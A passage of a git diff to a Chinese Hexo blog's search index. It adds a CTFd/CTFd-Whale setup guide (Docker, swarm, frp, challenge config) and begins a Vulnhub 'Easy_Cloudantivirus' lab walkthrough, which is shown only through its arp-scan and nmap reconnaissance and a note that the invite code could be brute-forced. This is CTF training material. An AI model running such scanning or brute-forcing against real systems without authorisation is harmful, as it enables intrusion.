@@ -1,6 +1,234 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTFd+CTFd_Whale</title>
+    <url>/2023/03/25/Docker/CTFd+CTFd_Whale_20230325/</url>
+    <content><![CDATA[<ul>
+<li>上次搭建 CTFd 还是好久好久之前（2年叭），前阵子由于院校比赛需要又捡起来了，这次顺便将动态靶场搭建（Whale）和动态 Flag 都搞上，经过漫长的百度流程，还是总结出了蛮多东西的。</li>
+</ul>
+<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><ul>
+<li><p>之前有按照网上的文章从零开始搭建 CTFd + Whale，经过了两天的努力侥幸成功了两次（淦），其它都会出现动态靶场出现地址，但是 CTFd 不会拉取镜像的问题（QAQ）。</p>
+</li>
+<li><p>本来已经放弃，又看到 VaalaCat 师傅的文章可以一键启动，尝试了两遍没问题，写一份文档备用。</p>
+</li>
+<li><p>VaalaCat 师傅文章地址：<a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">传送门</a></p>
+</li>
+<li><p>Linux 系统版本：Ubuntu 18.04（众多师傅的反馈发现 Ubuntu 20 会出现不可预测的 bug，我之前也是用 Ubuntu 20.04）</p>
+</li>
+</ul>
+<h1 id="Ubuntu-靶机安装"><a href="#Ubuntu-靶机安装" class="headerlink" title="Ubuntu 靶机安装"></a>Ubuntu 靶机安装</h1><ul>
+<li>VM 安装过程略。</li>
+<li>登录后修改下 root 密码：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行 SSH 安装，目前靶机用不到 VMware Tools：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y ssh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因为要后续要进行多个软件安装，更新下 apt 源：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y vim</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">aliyun</span></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更新 apt 源：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update -y</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>由于需要 curl 下载文件，安装一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y curl</span><br></pre></td></tr></table></figure>
+
+<h1 id="Docker-环境安装"><a href="#Docker-环境安装" class="headerlink" title="Docker 环境安装"></a>Docker 环境安装</h1><ul>
+<li>由于动态靶机是使用 docker 实现的，所以首先要准备安装一下 docker（这一步耗时较长）：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后还要准备 docker-compose（建议使用 proxychains 代理下载）：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y python3-pip</span><br><span class="line"></span><br><span class="line">pip3 install docker-compose -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这时会出现报错信息：</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">Command &quot;python setup.py egg<span class="built_in">_</span>info&quot; failed with error code 1 in /tmp/pip-build-5ydi0mj7/cryptography/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>百度了一下，需要更新 pip：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade --force pip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再次安装 docker-compose 即可。</li>
+</ul>
+<h1 id="Docker-集群配置"><a href="#Docker-集群配置" class="headerlink" title="Docker 集群配置"></a>Docker 集群配置</h1><ul>
+<li>Whale 插件使用的是集群的模式，所以这里要创建一个单个服务器的集群：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后将这个服务器加入集群：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker node update --label-add=&#x27;name=linux-1&#x27; $(docker node ls -q)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>最后要准备的是给 docker 更换镜像源，不然会很龟速，修改文件 &#x2F;etc&#x2F;docker&#x2F;daemon.json：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://y5u7p3c7.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重启 docker 生效：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+<h1 id="CTFd-Whale-安装"><a href="#CTFd-Whale-安装" class="headerlink" title="CTFd + Whale 安装"></a>CTFd + Whale 安装</h1><ul>
+<li>使用 VaalaCat 师傅整合好的 ctfd：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Un1kTeam/CTFd --depth=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改 frp 配置文件（看自己需求，不变就不动）：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">frps.ini</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 9123</span><br><span class="line">token = your_token</span><br><span class="line">subdomain_host = node.vaala.ink</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">token = your_token</span><br><span class="line">server_addr = 172.1.0.3</span><br><span class="line">server_port = 7000</span><br><span class="line">admin_addr = 172.1.0.4</span><br><span class="line">admin_port = 7400</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>插件初始化、更新或检查子模块：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启动 CTFd（巨慢，我用了半小时）：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看下 5 个容器是否正常运行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">root@docker:/opt/CTFd# docker ps</span><br><span class="line">CONTAINER ID   IMAGE               COMMAND                  CREATED         STATUS         PORTS                                                                                                      NAMES</span><br><span class="line">47daf4dfd0b4   glzjin/frp:latest   &quot;/usr/local/bin/frpc…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_frpc_1</span><br><span class="line">07dc9cfaab10   ctfd_ctfd           &quot;/opt/CTFd/docker-en…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:9124-&gt;8000/tcp, :::9124-&gt;8000/tcp                                                                  ctfd_ctfd_1</span><br><span class="line">501401fb07ff   mariadb:10.4.12     &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_db_1</span><br><span class="line">39163c2ad93e   glzjin/frp          &quot;/usr/local/bin/frps…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:9123-&gt;9123/tcp, :::9123-&gt;9123/tcp, 0.0.0.0:9125-9129-&gt;9125-9129/tcp, :::9125-9129-&gt;9125-9129/tcp   ctfd_frps_1</span><br><span class="line">0cc9acac2e4c   redis:4             &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_cache_1</span><br></pre></td></tr></table></figure>
+
+<h1 id="Whale-配置"><a href="#Whale-配置" class="headerlink" title="Whale 配置"></a>Whale 配置</h1><ul>
+<li>新版 CTFd 的 Whale 和旧版不同，做了板块区分，这里 VaalaCat 师傅已经配好了。</li>
+<li>左侧 Docker 菜单栏如果没有特殊需求无需更改，只需更改左侧 Frp 菜单栏中的内容：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">项</th>
+<th align="center">内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Http Domain Suffix</td>
+<td align="center"><code>node.vaala.ink </code> ，这里填写使用 HTTP 方式访问靶机的泛解析域名</td>
+</tr>
+<tr>
+<td align="center">Http Port</td>
+<td align="center"><code>9123</code>，这里填写 frps 中的 vhost_http_port，该端口为 HTTP 方式靶机访问的端口</td>
+</tr>
+<tr>
+<td align="center">Direct IP Address</td>
+<td align="center"><code>chive.vaala.cloud</code>，这里填写服务器 IP，用于显示 Direct 方式访问的题目的IP</td>
+</tr>
+<tr>
+<td align="center">Direct Minimum Port</td>
+<td align="center"><code>9125</code>，这里填写用于动态靶机 Direct 方式的开始端口</td>
+</tr>
+<tr>
+<td align="center">Direct Maximum Port</td>
+<td align="center"><code>9129</code>，这里填写最大端口</td>
+</tr>
+</tbody></table>
+<ul>
+<li>只需要填入 Direct IP Address 即可。</li>
+<li>最后点一下更新就可以保存配置了，填写完成后新建题目测试是否成功，按下表新建题目，表中没有提到的保持默认就好：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">项</th>
+<th align="center">内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Choose Challenge Type</td>
+<td align="center"><code>Dynamic docker</code></td>
+</tr>
+<tr>
+<td align="center">Name</td>
+<td align="center"><code>test</code></td>
+</tr>
+<tr>
+<td align="center">Category</td>
+<td align="center"><code>test</code></td>
+</tr>
+<tr>
+<td align="center">Docker Image</td>
+<td align="center"><code>vaalacat/push_f12</code></td>
+</tr>
+<tr>
+<td align="center">Frp Redirect Type</td>
+<td align="center"><code>Direct</code>或者 <code>Http</code></td>
+</tr>
+<tr>
+<td align="center">Frp Redirect Port</td>
+<td align="center"><code>80</code></td>
+</tr>
+<tr>
+<td align="center">Initial Value</td>
+<td align="center"><code>1</code></td>
+</tr>
+<tr>
+<td align="center">Decay Limit</td>
+<td align="center"><code>1</code></td>
+</tr>
+<tr>
+<td align="center">Minimum Value</td>
+<td align="center"><code>1</code></td>
+</tr>
+<tr>
+<td align="center">Score Type</td>
+<td align="center"><code>dynamic score</code></td>
+</tr>
+</tbody></table>
+<ul>
+<li>新建题目过后点击启动，然后等待靶机创建，可以在服务器中 <code>docker ps -a</code> 查看是否启动，若启动成功则搭建完成。</li>
+</ul>
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/Whale_0830.png" alt="Whale_0830" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/Whale_0830 (2).png" alt="Whale_0830 (2)" />
+
+<h1 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h1><ul>
+<li>VaalaCat 师傅仓库中所使用的端口一共有三类，需要修改平台信息请按照以下文件位置修改： <ul>
+<li>9123（一般用不到，都采用直连）: <ul>
+<li>默认 http 模式靶机访问端口，需要修改 <code>frps.ini</code>、后台中的 <code>Http Port</code>、<code>docker-compose.yml</code></li>
+</ul>
+</li>
+<li>9124: <ul>
+<li>默认为 ctfd 端口，需要修改 <code>docker-compose.yml</code></li>
+</ul>
+</li>
+<li>9125-9129: <ul>
+<li>动态靶机 Direct 模式端口，需要修改 <code>docker-compose.yml</code>、后台中的端口范围</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker 容器自启动</title>
     <url>/2023/08/17/Docker/Docker%20%E5%AE%B9%E5%99%A8%E8%87%AA%E5%90%AF%E5%8A%A8_20230817/</url>
     <content><![CDATA[<ul>
@@ -604,231 +832,152 @@
       </tags>
   </entry>
   <entry>
-    <title>CTFd+CTFd_Whale</title>
-    <url>/2023/03/25/Docker/CTFd+CTFd_Whale_20230325/</url>
+    <title>Easy_Cloudantivirus</title>
+    <url>/2023/01/07/Vulnhub_Kali/02.Easy_Cloudantivirus_20230107/</url>
     <content><![CDATA[<ul>
-<li>上次搭建 CTFd 还是好久好久之前（2年叭），前阵子由于院校比赛需要又捡起来了，这次顺便将动态靶场搭建（Whale）和动态 Flag 都搞上，经过漫长的百度流程，还是总结出了蛮多东西的。</li>
+<li>Vulnhub_Kali 填坑系列（二）启动，总体难度不大，主要考验思路。</li>
+<li>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></li>
+<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
 </ul>
-<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><ul>
-<li><p>之前有按照网上的文章从零开始搭建 CTFd + Whale，经过了两天的努力侥幸成功了两次（淦），其它都会出现动态靶场出现地址，但是 CTFd 不会拉取镜像的问题（QAQ）。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
+<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
+<li>首先查看 Kali IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描当前网段，发现靶机 IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.107  08:00:27:1e:54:35       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.987 seconds (128.84 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:31 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,8080 -sV 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:32 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
+</ul>
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222318218.png" alt="image-20230830222318218" />
+
+<ul>
+<li><p>只有一个输入框，需要使用邀请码登录。没啥多余的东西，这时一般是存在两种方法：</p>
+<ul>
+<li><p>暴力破解</p>
 </li>
-<li><p>本来已经放弃，又看到 VaalaCat 师傅的文章可以一键启动，尝试了两遍没问题，写一份文档备用。</p>
-</li>
-<li><p>VaalaCat 师傅文章地址：<a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">传送门</a></p>
-</li>
-<li><p>Linux 系统版本：Ubuntu 18.04（众多师傅的反馈发现 Ubuntu 20 会出现不可预测的 bug，我之前也是用 Ubuntu 20.04）</p>
-</li>
-</ul>
-<h1 id="Ubuntu-靶机安装"><a href="#Ubuntu-靶机安装" class="headerlink" title="Ubuntu 靶机安装"></a>Ubuntu 靶机安装</h1><ul>
-<li>VM 安装过程略。</li>
-<li>登录后修改下 root 密码：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>进行 SSH 安装，目前靶机用不到 VMware Tools：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y ssh</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>因为要后续要进行多个软件安装，更新下 apt 源：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y vim</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">aliyun</span></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>更新 apt 源：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update -y</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>由于需要 curl 下载文件，安装一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y curl</span><br></pre></td></tr></table></figure>
-
-<h1 id="Docker-环境安装"><a href="#Docker-环境安装" class="headerlink" title="Docker 环境安装"></a>Docker 环境安装</h1><ul>
-<li>由于动态靶机是使用 docker 实现的，所以首先要准备安装一下 docker（这一步耗时较长）：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>然后还要准备 docker-compose（建议使用 proxychains 代理下载）：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y python3-pip</span><br><span class="line"></span><br><span class="line">pip3 install docker-compose -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这时会出现报错信息：</li>
-</ul>
-<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">Command &quot;python setup.py egg<span class="built_in">_</span>info&quot; failed with error code 1 in /tmp/pip-build-5ydi0mj7/cryptography/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>百度了一下，需要更新 pip：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade --force pip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>再次安装 docker-compose 即可。</li>
-</ul>
-<h1 id="Docker-集群配置"><a href="#Docker-集群配置" class="headerlink" title="Docker 集群配置"></a>Docker 集群配置</h1><ul>
-<li>Whale 插件使用的是集群的模式，所以这里要创建一个单个服务器的集群：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>然后将这个服务器加入集群：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker node update --label-add=&#x27;name=linux-1&#x27; $(docker node ls -q)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>最后要准备的是给 docker 更换镜像源，不然会很龟速，修改文件 &#x2F;etc&#x2F;docker&#x2F;daemon.json：</li>
-</ul>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://y5u7p3c7.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>重启 docker 生效：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
-
-<h1 id="CTFd-Whale-安装"><a href="#CTFd-Whale-安装" class="headerlink" title="CTFd + Whale 安装"></a>CTFd + Whale 安装</h1><ul>
-<li>使用 VaalaCat 师傅整合好的 ctfd：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Un1kTeam/CTFd --depth=1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改 frp 配置文件（看自己需求，不变就不动）：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">frps.ini</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 9123</span><br><span class="line">token = your_token</span><br><span class="line">subdomain_host = node.vaala.ink</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">token = your_token</span><br><span class="line">server_addr = 172.1.0.3</span><br><span class="line">server_port = 7000</span><br><span class="line">admin_addr = 172.1.0.4</span><br><span class="line">admin_port = 7400</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>插件初始化、更新或检查子模块：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>启动 CTFd（巨慢，我用了半小时）：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看下 5 个容器是否正常运行：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">root@docker:/opt/CTFd# docker ps</span><br><span class="line">CONTAINER ID   IMAGE               COMMAND                  CREATED         STATUS         PORTS                                                                                                      NAMES</span><br><span class="line">47daf4dfd0b4   glzjin/frp:latest   &quot;/usr/local/bin/frpc…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_frpc_1</span><br><span class="line">07dc9cfaab10   ctfd_ctfd           &quot;/opt/CTFd/docker-en…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:9124-&gt;8000/tcp, :::9124-&gt;8000/tcp                                                                  ctfd_ctfd_1</span><br><span class="line">501401fb07ff   mariadb:10.4.12     &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_db_1</span><br><span class="line">39163c2ad93e   glzjin/frp          &quot;/usr/local/bin/frps…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:9123-&gt;9123/tcp, :::9123-&gt;9123/tcp, 0.0.0.0:9125-9129-&gt;9125-9129/tcp, :::9125-9129-&gt;9125-9129/tcp   ctfd_frps_1</span><br><span class="line">0cc9acac2e4c   redis:4             &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes                                                                                                              ctfd_cache_1</span><br></pre></td></tr></table></figure>
-
-<h1 id="Whale-配置"><a href="#Whale-配置" class="headerlink" title="Whale 配置"></a>Whale 配置</h1><ul>
-<li>新版 CTFd 的 Whale 和旧版不同，做了板块区分，这里 VaalaCat 师傅已经配好了。</li>
-<li>左侧 Docker 菜单栏如果没有特殊需求无需更改，只需更改左侧 Frp 菜单栏中的内容：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">项</th>
-<th align="center">内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Http Domain Suffix</td>
-<td align="center"><code>node.vaala.ink </code> ，这里填写使用 HTTP 方式访问靶机的泛解析域名</td>
-</tr>
-<tr>
-<td align="center">Http Port</td>
-<td align="center"><code>9123</code>，这里填写 frps 中的 vhost_http_port，该端口为 HTTP 方式靶机访问的端口</td>
-</tr>
-<tr>
-<td align="center">Direct IP Address</td>
-<td align="center"><code>chive.vaala.cloud</code>，这里填写服务器 IP，用于显示 Direct 方式访问的题目的IP</td>
-</tr>
-<tr>
-<td align="center">Direct Minimum Port</td>
-<td align="center"><code>9125</code>，这里填写用于动态靶机 Direct 方式的开始端口</td>
-</tr>
-<tr>
-<td align="center">Direct Maximum Port</td>
-<td align="center"><code>9129</code>，这里填写最大端口</td>
-</tr>
-</tbody></table>
-<ul>
-<li>只需要填入 Direct IP Address 即可。</li>
-<li>最后点一下更新就可以保存配置了，填写完成后新建题目测试是否成功，按下表新建题目，表中没有提到的保持默认就好：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">项</th>
-<th align="center">内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Choose Challenge Type</td>
-<td align="center"><code>Dynamic docker</code></td>
-</tr>
-<tr>
-<td align="center">Name</td>
-<td align="center"><code>test</code></td>
-</tr>
-<tr>
-<td align="center">Category</td>
-<td align="center"><code>test</code></td>
-</tr>
-<tr>
-<td align="center">Docker Image</td>
-<td align="center"><code>vaalacat/push_f12</code></td>
-</tr>
-<tr>
-<td align="center">Frp Redirect Type</td>
-<td align="center"><code>Direct</code>或者 <code>Http</code></td>
-</tr>
-<tr>
-<td align="center">Frp Redirect Port</td>
